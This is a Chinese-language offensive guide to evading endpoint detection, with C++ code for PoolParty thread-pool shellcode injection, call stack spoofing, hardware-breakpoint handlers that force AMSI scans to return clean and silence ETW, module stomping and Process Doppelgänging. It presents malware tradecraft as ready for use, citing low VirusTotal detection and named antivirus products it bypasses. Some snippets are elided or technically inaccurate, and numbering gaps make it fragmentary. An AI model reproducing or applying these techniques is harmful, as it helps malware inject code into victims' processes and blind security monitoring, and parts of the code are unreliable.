## 一、调用栈欺骗（Call Stack Spoofing）— 对抗EDR的终极武器

### 1.1 为什么需要栈欺骗
```
正常调用:  malware.exe!main → malware.exe!Inject → ntdll!NtAllocateVirtualMemory → syscall
                                  ↑ EDR看到调用来自malware.exe → 报警

间接syscall: malware.exe!Inject → ntdll!syscall_gadget → syscall
                                  ↑ 调用栈显示ntdll → 较安全，但返回地址仍在malware.exe

栈欺骗:     malware.exe!Inject → [构造的假栈帧] → ntdll!syscall_gadget → syscall
                                  ↑ 栈展开看到的是 kernel32.dll → 完全合法
```

## 二、PoolParty — 线程池注入（8种变体）

> GitHub: SafeBreach-Labs/PoolParty ⭐1264
> Black Hat EU 2023 发布

### 2.1 核心原理
```
传统注入: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
PoolParty: 利用Windows线程池工作项 → 直接排队shellcode地址为工作项
           无需新线程，shellcode在工作线程中执行
```

### 2.2 8种变体

| 变体 | 工作项类型 | 触发方式 |
|------|-----------|---------|
| **1** | Worker Factory | 覆写启动例程 |
| **2** | TP_WORK | 插入工作项到目标线程池 |
| **3** | TP_WAIT | 设置等待对象触发 |
| **4** | TP_IO | I/O完成端口触发 |
| **5** | TP_ALPC | ALPC消息触发 |
| **6** | TP_JOB | Job对象触发 |
| **7** | TP_DIRECT | 直接排队触发 |
| **8** | TP_TIMER | 可等待定时器触发（推荐⭐⭐⭐⭐⭐） |

### 2.3 变体8：TP_TIMER 实战代码
```cpp
// 变体8 — Timer工作项是最隐蔽的方式
BOOL PoolParty_V8(DWORD targetPid, unsigned char* shellcode, SIZE_T scSize) {
    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    
    // 2. 在目标进程分配RW内存
    PVOID remoteAddr = NULL;
    SIZE_T regionSize = scSize;
    NtAllocateVirtualMemory(hProcess, &remoteAddr, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 3. 写入shellcode
    NtWriteVirtualMemory(hProcess, remoteAddr, shellcode, scSize, NULL);
    
    // 4. 改为RX
    ULONG oldProtect;
    NtProtectVirtualMemory(hProcess, &remoteAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    
    // 5. 创建可等待定时器（在当前进程，不在目标进程）
    HANDLE hTimer = CreateWaitableTimerW(NULL, TRUE, NULL);
    
    // 6. 将shellcode作为Timer回调排队到目标线程池
    PTP_TIMER timer = CreateThreadpoolTimer(
        (PTP_TIMER_CALLBACK)remoteAddr,  // 回调 = shellcode地址！
        NULL,
        NULL
    );
    
    // 7. 设置定时器（-1表示相对时间，0表示立即触发）
    FILETIME dueTime;
    dueTime.dwLowDateTime = 0xFFFFFFFF; // -1 相对时间
    dueTime.dwHighDateTime = 0xFFFFFFFF;
    SetThreadpoolTimer(timer, (PFILETIME)&dueTime, 0, 0);
    
    // 8. 等待执行完成
    // Shellcode在目标进程的线程池工作线程中运行
    // 无CreateRemoteThread调用！
    
    return TRUE;
}
```

### 2.4 PoolParty 效果
- **VT检测率**: 2-5/70（变体8）
- **绕过**: Defender、360、火绒、CrowdStrike（部分）
- **特征**: 无新线程、无远程线程创建、利用正常线程池机制

## 三、HWBP（硬件断点）Unhooking & Syscall

### 3.1 原理
```
DR0-DR3: 硬件调试寄存器
→ 设置断点地址 = AmsiScanBuffer / EtwEventWrite
→ 执行到断点 → INT1异常 → VEH处理程序接管
→ 在VEH中修改执行流（跳过/返回假结果）
→ 内存页面保护不变 → 完整性检查绕过
```

### 3.2 VEH Unhooking 实现
```cpp
// VEH（Vectored Exception Handler）注册
PVOID hVeh = AddVectoredExceptionHandler(1, VehHandler);

// 在目标函数头部设置硬件断点
void SetHWBP(HANDLE hThread, PVOID targetAddr, int drIndex) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    GetThreadContext(hThread, &ctx);
    
    // 设置DR寄存器
    (&ctx.Dr0)[drIndex] = (DWORD64)targetAddr;
    // Dr7配置: 启用断点 + 执行类型
    ctx.Dr7 |= (1 << (drIndex * 2));        // 启用本地断点
    ctx.Dr7 &= ~(3 << (16 + drIndex * 4)); // 清除RW/类型
    ctx.Dr7 &= ~(3 << (18 + drIndex * 4)); // 长度=1字节
    
    SetThreadContext(hThread, &ctx);
}

// VEH处理程序
LONG WINAPI VehHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        PVOID faultAddr = ExceptionInfo->ExceptionRecord->ExceptionAddress;
        
        if (faultAddr == g_AmsiScanBufferAddr) {
            // AmsiScanBuffer触发了 → 修改返回值为AMSI_RESULT_CLEAN
            // 跳过函数体，直接返回干净结果
            ExceptionInfo->ContextRecord->Rax = S_OK; // AMSI_RESULT_CLEAN
            ExceptionInfo->ContextRecord->Rip += 1;    // 跳过断点
            
            // 重新启用断点（单步后会清除）
            SetHWBP_Fast(ExceptionInfo->ContextRecord, faultAddr, 0);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        
        if (faultAddr == g_EtwEventWriteAddr) {
            // EtwEventWrite → 直接返回
            ExceptionInfo->ContextRecord->Rax = 0; // STATUS_SUCCESS
            ExceptionInfo->ContextRecord->Rip += 1;
            SetHWBP_Fast(ExceptionInfo->ContextRecord, faultAddr, 0);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### 3.3 HWBP Syscall
```cpp
// 使用HWBP实现syscall调用（Kharon Agent风格）
// 1. 在NtAllocateVirtualMemory入口设置HWBP
// 2. 触发时VEH接管
// 3. VEH中手动构造syscall（绕过Hook）
// 4. 返回结果

LONG WINAPI SyscallVEH(PEXCEPTION_POINTERS ex) {
    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // 手动执行syscall
        // 设置寄存器
        ex->ContextRecord->R10 = ex->ContextRecord->Rcx; // syscall约定
        ex->ContextRecord->Rax = saved_ssn;               // 系统服务号
        
        // 跳转到ntdll中的syscall gadget
        // 实际是设置RIP到 gadget 地址
        ex->ContextRecord->Rip = (DWORD64)gadget_addr;
        
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### 3.4 HWBP优势
- **无需修改内存页保护** → 绕过完整性检查
- **不修改代码段** → 绕过静态+动态检测
- **DR寄存器难以监控** → 极少EDR监控调试寄存器

### 4.2 改进方法：分段Stomping

```cpp
DWORD usedSize = EstimateUsedSize(dllBase, textSize);
PVOID freeBase = (PBYTE)dllBase + usedSize;

// 写入shellcode到尾部

// 修改内存保护
VirtualProtect(freeBase, scSize, PAGE_EXECUTE_READ, &old);

// 创建线程 → EDR看到"winhttp.dll代码"
```

## 五、Process Hollowing增强版

### 5.1 Process Doppelgänging
```cpp
// 利用NTFS Transaction（事务）
// 1. 创建NTFS事务
HANDLE hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);

// 2. 在事务中创建文件 + 写入payload
CreateFileTransacted(targetExe, ..., hTransaction, ...);
WriteFile(hFile, payload, ...);

// 3. 从事务中创建Section

// 4. 回滚事务（文件从磁盘消失）

// 5. 从Section创建进程 — 文件从未在磁盘存在
```
